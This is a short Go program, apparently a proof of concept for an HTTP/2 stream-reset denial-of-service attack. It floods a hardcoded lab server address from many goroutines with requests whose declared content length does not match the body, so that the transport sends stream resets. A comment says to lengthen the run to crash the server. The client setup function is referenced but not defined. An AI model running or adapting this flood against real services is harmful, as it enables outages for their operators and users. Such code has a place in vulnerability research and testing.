package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"time"
)

var (
	listenPort = flag.Int("listen_port", 443, "Server listening port")
	certFile   = flag.String("cert_file", "server.crt", "TLS server cert")
	numWorkers = flag.Int("num_workers", 16, "number of async workers")
)

func asyncWorker(workerId int, serverUrl *url.URL) {
	// Abuse the checks on body size to send Stream RSTs
	// https://go.googlesource.com/net/+/master/http2/transport.go#1748
	client := initClient()
	for i := 0; ; i++ {
		request := &http.Request{
			URL:           serverUrl,
			ContentLength: 2,
			Body:          io.NopCloser(bytes.NewReader([]byte("test"))),
		}
		client.Do(request)
		// log.Printf("[worker %d] request %d: %s", workerId, i, err)
	}
}

func main() {
	// Connect to Test Device Instance
	serverUrl, err := url.Parse(fmt.Sprintf("https://192.168.130.129:%d", *listenPort))
	if err != nil {
		log.Fatalf("failed to parse internal URL: %s", err)
	}

	for i := 0; i < *numWorkers; i++ {
		go asyncWorker(i, serverUrl)
	}

	// Change to longer period to crash the server
	time.Sleep(10 * time.Second)
}
